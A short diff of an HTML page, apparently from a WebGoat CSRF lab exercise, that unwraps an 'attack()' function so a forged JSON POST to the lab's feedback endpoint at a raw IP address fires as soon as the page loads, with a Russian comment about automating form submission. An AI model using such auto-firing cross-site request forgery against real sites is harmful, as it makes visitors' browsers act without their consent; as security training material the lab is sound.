@@ -66,7 +66,6 @@
         });
   </script>
   <script>       
-    function attack(){
       var xhr = new XMLHttpRequest();
       xhr.open('POST', 'http://18.214.61.110:8888/WebGoat/csrf/feedback/message', true);
       xhr.send('{
@@ -74,7 +73,6 @@
   "email"   : "webgoat@webgoat.org",
   "content" : "WebGoat is the best!!"
 }');
-    }
   </script>
   <!-- <script>document.getElementById('lesson2').submit(); </script>  onload=document.getElementById('cat').submit(); Для автоматизации submit-->
 </html>
